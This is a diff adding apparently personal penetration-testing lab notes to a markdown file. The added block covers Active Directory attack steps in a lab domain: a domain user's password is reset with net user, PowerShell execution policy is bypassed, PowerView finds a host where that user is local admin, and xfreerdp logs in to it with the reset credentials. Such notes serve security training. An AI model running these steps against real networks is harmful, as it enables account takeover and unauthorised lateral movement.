@@ -2264,4 +2264,34 @@ chmod +x ./BloodHound
 ./BloodHound --disable-gpu
 ~~~
 
+~~~ powershell
+# =====================TargetA(WIN)
+PS C:\Tools> net user robert Password123! /domain
+The request will be processed at a domain controller for domain corp.com.
 
+The command completed successfully.
+
+PS C:\Tools> runas /user:corp\robert cmd.exe
+
+# =====================TargetB(WIN)
+c:\Tools>powershell -exec bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> Find-LocalAdminAccess
+client74.corp.com
+PS C:\Tools> nslookup client74.corp.com
+DNS request timed out.
+    timeout was 2 seconds.
+Server:  UnKnown
+Address:  192.168.244.70
+
+Name:    client74.corp.com
+Address:  192.168.244.74
+
+# =====================Kali
+$ xfreerdp3 /u:robert /p:'Password123!' /d:corp.com /v:192.168.244.74
+~~~
